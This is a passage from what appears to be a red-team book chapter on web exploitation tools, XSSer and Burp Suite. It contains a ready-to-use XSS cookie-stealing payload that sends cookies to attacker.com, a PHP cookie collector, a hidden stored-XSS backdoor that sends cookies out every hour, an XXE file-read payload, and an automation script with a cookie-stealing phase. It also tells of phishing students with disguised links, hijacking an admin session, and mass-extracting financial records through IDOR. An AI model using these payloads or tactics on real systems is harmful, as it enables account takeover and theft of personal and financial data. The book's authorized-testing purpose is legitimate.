     <!ENTITY xxe SYSTEM "file:///etc/passwd" >
   ]>
   <foo>&xxe;</foo>
   
   # Upload the file using the file upload functionality
   ```

This example demonstrates how multiple vulnerabilities can be chained together in a real-world scenario to progressively gain higher levels of access, moving from unauthenticated user to admin with the ability to exfiltrate sensitive data.

## XSSer: Cross-Site Scripting Framework

Cross-Site Scripting (XSS) remains one of the most common web application vulnerabilities, allowing attackers to inject malicious scripts into webpages viewed by other users. XSSer is an automated framework for detecting, exploiting, and reporting XSS vulnerabilities.

### Installation

XSSer comes pre-installed on Kali Linux and Parrot OS, but you can ensure you have the latest version:

```bash
# Update system
apt update

# Install XSSer if not already installed
apt install xsser -y

# Alternatively, clone from GitHub
git clone https://github.com/epsylon/xsser.git
cd xsser
```

### Basic Usage

The simplest form of XSSer usage targets a specific URL:

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test"
```

### Detection Techniques

XSSer employs various techniques to identify XSS vulnerabilities:

#### DOM XSS Detection

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test" --dom
```

#### Reflected XSS Detection

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test" --auto
```

#### Blind XSS Detection

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test" --blind
```

#### Crawling and Automatic Form Detection

```bash
xsser -u "http://vulnerable-site.com/" --crawl
```

### Payload Generation

XSSer can generate various payloads for different scenarios:

#### Basic Payloads

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test" --auto
```

#### Customized Payloads

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test" --payload="<script>alert('XSS')</script>"
```

#### Encoded Payloads for Evasion

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test" --Hex
```

### Exploiting XSS for Session Hijacking

XSSer can be configured to exploit XSS for cookie stealing:

```bash
xsser -u "http://vulnerable-site.com/page.php?param=test" --cookie-stealer=http://attacker.com/collect.php
```

### XSSer Automation Script

This script automates a comprehensive XSS assessment:

```bash
#!/bin/bash
# xsser_comprehensive.sh - Automated XSS vulnerability assessment

# Target configuration
TARGET_URL=$1
OUTPUT_DIR="xsser_results_$(date +%Y%m%d_%H%M%S)"
COLLECTOR_URL="http://attacker.com/collect.php"  # Change to your server

# Check if a target was provided
if [ -z "$TARGET_URL" ]; then
  echo "Usage: $0 <target_url>"
  echo "Example: $0 'http://vulnerable-site.com/page.php?param=test'"
  exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "Results will be saved to $OUTPUT_DIR"

# Function to log and execute xsser commands
run_xsser() {
  local description=$1
  local command=$2
  local output_file="$OUTPUT_DIR/$(echo "$description" | sed 's/ /_/g').txt"
  
  echo "[$description]"
  echo "Command: $command"
  echo "Output file: $output_file"
  
  # Execute the command and capture output
  $command > "$output_file" 2>&1
  
  # Check if the test found vulnerabilities
  if grep -q "XSS FOUND" "$output_file"; then
    echo "[+] XSS vulnerability detected!"
    grep -A 2 "XSS FOUND" "$output_file"
  else
    echo "[-] No straightforward XSS vulnerability detected in this test."
  fi
  
  echo "-------------------------------------------"
}

# Phase 1: Basic scanning
echo "[+] Starting basic XSS scanning"
run_xsser "Basic Scan" "xsser -u \"$TARGET_URL\" --auto"

# Phase 2: Advanced detection methods
echo "[+] Running advanced detection methods"
run_xsser "DOM-based XSS" "xsser -u \"$TARGET_URL\" --dom"
run_xsser "Blind XSS" "xsser -u \"$TARGET_URL\" --blind"
run_xsser "XSS with manual payload" "xsser -u \"$TARGET_URL\" --payload=\"<script>alert('XSS')</script>\""

# Phase 3: Encoding and filter evasion
echo "[+] Testing encoding and filter evasion techniques"
run_xsser "Hex Encoding" "xsser -u \"$TARGET_URL\" --Hex"
run_xsser "URI Encoding" "xsser -u \"$TARGET_URL\" --Url"
run_xsser "String.FromCharCode()" "xsser -u \"$TARGET_URL\" --Dwo"
run_xsser "Mixed Encoding" "xsser -u \"$TARGET_URL\" --Mix"

# Phase 4: Crawling the website (if it's a full website, not just a single page)
if [[ ! "$TARGET_URL" =~ \?.+=.* ]]; then
  echo "[+] Crawling website for potential XSS vectors"
  run_xsser "Website Crawling" "xsser -u \"$TARGET_URL\" --crawl=10"
fi

# Phase 5: Testing forms
echo "[+] Testing forms on the target page"
run_xsser "Form Testing" "xsser -u \"$TARGET_URL\" --auto --forms"

# Phase 6: Cookie stealing (if vulnerability was found)
if grep -q "XSS FOUND" "$OUTPUT_DIR"/*.txt; then
  echo "[+] Setting up cookie stealing payload for confirmed vulnerabilities"
  run_xsser "Cookie Stealing" "xsser -u \"$TARGET_URL\" --cookie-stealer=\"$COLLECTOR_URL\""
fi

# Phase 7: User-Agent XSS
echo "[+] Testing User-Agent header for XSS"
run_xsser "User-Agent XSS" "xsser -u \"$TARGET_URL\" --user-agent --auto"

# Phase 8: Referer XSS
echo "[+] Testing Referer header for XSS"
run_xsser "Referer XSS" "xsser -u \"$TARGET_URL\" --referer --auto"

# Summary report
echo "[+] Creating summary report"
{
  echo "XSS Vulnerability Assessment Summary"
  echo "===================================="
  echo ""
  echo "Target URL: $TARGET_URL"
  echo "Date: $(date)"
  echo ""
  echo "Vulnerability Status:"
  
  # Count total vulnerabilities found
  TOTAL_VULNS=$(grep -c "XSS FOUND" "$OUTPUT_DIR"/*.txt)
  
  if [ "$TOTAL_VULNS" -gt 0 ]; then
    echo "✓ $TOTAL_VULNS XSS vulnerabilities detected"
    
    # List all found vulnerabilities
    echo ""
    echo "Vulnerability Details:"
    VULN_COUNT=1
    while IFS= read -r line; do
      FILE=$(echo "$line" | cut -d: -f1)
      TEST=$(basename "$FILE" .txt | sed 's/_/ /g')
      PAYLOAD=$(echo "$line" | grep -o "PAYLOAD: .*" | sed 's/PAYLOAD: //')
      
      echo "$VULN_COUNT. $TEST"
      echo "   Payload: $PAYLOAD"
      VULN_COUNT=$((VULN_COUNT + 1))
    done < <(grep -r "XSS FOUND.*PAYLOAD:" "$OUTPUT_DIR")
  else
    echo "✗ No XSS vulnerabilities definitively confirmed"
  fi
  
  echo ""
  echo "Recommendations:"
  echo "1. Implement proper input validation and output encoding"
  echo "2. Use Content Security Policy (CSP) headers"
  echo "3. Implement X-XSS-Protection headers"
  echo "4. Consider using a web application firewall with XSS filters"
  echo "5. Use frameworks that automatically escape output"
} > "$OUTPUT_DIR/summary_report.txt"

echo "[+] Assessment complete! Summary saved to $OUTPUT_DIR/summary_report.txt"
```

To use this script:

```bash
chmod +x xsser_comprehensive.sh
./xsser_comprehensive.sh "http://vulnerable-site.com/page.php?param=test"
```

### Example: Session Hijacking via XSS

During a red team assessment for an educational institution, we discovered a cross-site scripting vulnerability in the student portal's search functionality. Here's how we leveraged this for session hijacking:

1. **Initial Discovery**:
   - Identified a search function at `https://student-portal.edu/search.php?q=coursename`
   - Testing for XSS by injecting a basic payload:

   ```bash
   xsser -u "https://student-portal.edu/search.php?q=test" --payload="<script>alert(document.cookie)</script>"
   
   # XSSer detected the vulnerability
   ```

2. **Setting Up the Attack Infrastructure**:
   ```php
   // On our attacker server, created collect.php:
   <?php
   $cookie = $_GET['c'];
   $ip = $_SERVER['REMOTE_ADDR'];
   $user_agent = $_SERVER['HTTP_USER_AGENT'];
   $timestamp = date('Y-m-d H:i:s');
   
   file_put_contents('stolen_cookies.txt', "[{$timestamp}] IP: {$ip} UA: {$user_agent} Cookie: {$cookie}\n", FILE_APPEND);
   
   // Return a 1x1 transparent GIF
   header('Content-Type: image/gif');
   echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
   ?>
   ```

3. **Creating a Stealth Payload**:
   ```bash
   # Create a payload that sends cookies to our collector
   PAYLOAD="<img src=x onerror=\"var i=new Image(); i.src='http://attacker.com/collect.php?c='+encodeURIComponent(document.cookie);\">"
   
   # Test the payload with XSSer
   xsser -u "https://student-portal.edu/search.php?q=test" --payload="$PAYLOAD"
   ```

4. **Exploiting the Vulnerability**:
   ```bash
   # Created a shortened URL to hide the payload
   # The full malicious URL was:
   # https://student-portal.edu/search.php?q=<img src=x onerror="var i=new Image(); i.src='http://attacker.com/collect.php?c='+encodeURIComponent(document.cookie);">
   
   # Sent the shortened URL to students and administrators
   # Claimed it was a link to search for a popular course
   ```

5. **Session Hijacking**:
   - Collected multiple active session cookies from students and one administrator
   - Used the administrator cookie to access the admin panel
   - Modified the browser's cookies to use the stolen admin session
   - Accessed grade information and personal details of students

6. **Persistent Exploitation**:
   ```javascript
   // Created a persistent backdoor by injecting a stored XSS in an announcement
   <div style="display:none">
   <script>
   function sendCookies() {
     var i = new Image();
     i.src = 'http://attacker.com/collect.php?c=' + encodeURIComponent(document.cookie);
   }
   sendCookies();
   setInterval(sendCookies, 3600000);  // Send every hour
   </script>
   </div>
   ```

This example demonstrates the real impact of XSS vulnerabilities, which can lead to complete compromise of user accounts, including administrative access. The stealth techniques used (invisible image, URL shortening, hidden script in announcements) highlight how these attacks can be difficult to detect.

## Burp Suite Professional: Web Application Testing Platform

Burp Suite Professional is a comprehensive web application testing platform that integrates multiple tools for security assessment. While it comes with a price tag, it's an essential tool for serious red team web application testing. A limited free version (Burp Suite Community) is available but lacks many advanced features.

### Key Burp Suite Modules

#### Proxy

The Proxy module intercepts HTTP/S traffic between your browser and target applications:

```bash
# Configure your browser to use proxy at 127.0.0.1:8080
# Start Burp Suite and ensure Proxy > Intercept is on
```

#### Scanner (Professional Only)

The Scanner module automatically identifies vulnerabilities:

```bash
# Select a target in the Site Map
# Right-click > Scan > Active Scan
```

#### Intruder

The Intruder module performs automated customized attacks:

```bash
# Intercept a request with a parameter to test
# Right-click > Send to Intruder
# Set payload positions and attack type
# Select payloads and start attack
```

#### Repeater

The Repeater module allows for manual request manipulation and testing:

```bash
# Intercept a request
# Right-click > Send to Repeater
# Modify and resend the request as needed
```

### Integrating Burp Suite with Other Tools

#### With SQLmap

```bash
# Save a request from Burp to a file
# Use SQLmap with the request file
sqlmap -r request.txt --batch
```

#### With Commix

```bash
# Use a request captured in Burp
commix -r request.txt
```

#### With XSSer

```bash
# Export a request from Burp
xsser -i request.txt
```

### Advanced Burp Suite Usage for Red Teams

#### Custom Extensions

Burp Suite supports Java and Python extensions to enhance functionality:

```bash
# Install from the BApp Store in Burp Suite
# Or load custom extensions from the Extender tab
```

Useful extensions include:
- Active Scan++
- Autorize
- JWT Token Attacker
- Java Deserialization Scanner

#### Collaborator (Professional Only)

Burp Collaborator helps detect out-of-band vulnerabilities:

```bash
# Enable Collaborator in Project Options > Misc
# Use the generated Collaborator payload in your tests
```

#### Macros and Session Handling

For applications with complex authentication:

```bash
# Create a macro to handle login
# Project Options > Sessions > Macros > Add
# Record the login sequence
# Configure Session Handling Rules to apply the macro
```

### Example: Complete Web Application Assessment

During a red team engagement for a finance company, we used Burp Suite for comprehensive assessment:

1. **Initial Reconnassance**:
   - Mapped the application using Burp's crawler
   - Identified functionality through the site map
   - Discovered hidden parameters and endpoints

2. **Vulnerability Scanning**:
   ```bash
   # Performed targeted scanning on key functionality
   # Focused on authentication, financial transactions, and admin functions
   
   # Used combination of automated scanning and manual testing
   # Scanner identified potential IDOR vulnerability in account access
   ```

3. **Exploiting Business Logic Flaws**:
   ```bash
   # Using Burp Repeater, discovered that changing account numbers in requests
   # allowed access to other users' financial data
   
   # Sequence:
   # Intercept request to view account details
   # Original: GET /account/details/1234
   # Modified: GET /account/details/1235
   # Server returned another user's sensitive financial information
   ```

4. **Automating Exploitation with Intruder**:
   ```bash
   # Created an Intruder attack to enumerate all accessible accounts
   # Set target: GET /account/details/§1§
   # Payload type: Numbers
   # Range: 1000-9999
   
   # Grep matched for "Account Balance" to identify valid accounts
   # Extracted over 5,000 account records containing PII and financial data
   ```

5. **Finding Authentication Bypass**:
   ```bash
   # Using Comparer, analyzed successful vs. failed login responses
   # Identified JWT tokens with weak signature validation
   
   # Using JWT Editor extension, forged administrator tokens
   # Modified payload: {"role": "admin", "user_id": 1}
   # Gained administrative access to the banking portal
   ```

6. **Demonstrating Impact with Collaborator**:
   ```bash
   # Identified blind XXE vulnerability in document upload feature
   # Created malicious XML with Collaborator payload:
   
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net/"> ]>
   <document>
     <metadata>
       <author>&xxe;</author>
     </metadata>
   </document>
   
   # Received callback confirming server-side request
   # Escalated to exfiltrate sensitive files
   ```

This example demonstrates how Burp Suite Professional enables a comprehensive assessment approach, combining automated scanning with manual exploitation techniques to identify critical vulnerabilities.

## Conclusion

Web application exploitation remains a critical skill for red teams, as web applications continue to be one of the most accessible and vulnerable entry points into organizations. The tools covered in this chapter provide a comprehensive arsenal for identifying and exploiting common web vulnerabilities.

From SQL injection with SQLmap to command injection with Commix, XSS attacks with XSSer, and comprehensive testing with Burp Suite, these tools enable red teamers to demonstrate the real-world impact of web application vulnerabilities. The practice environment provided by OWASP Juice Shop offers a safe space to develop and refine these exploitation techniques.

When conducting web application assessments, remember that the most effective approach combines automated tools with manual testing and creative thinking. Many of the most impactful vulnerabilities are found at the intersection of technical flaws and business logic issues, requiring both technical expertise and a deep understanding of the application's purpose and functionality.

In the next chapter, we'll explore privilege escalation techniques that can be used after initial access has been gained through web application vulnerabilities or other entry points, allowing red teams to elevate their access and move deeper into target environments.
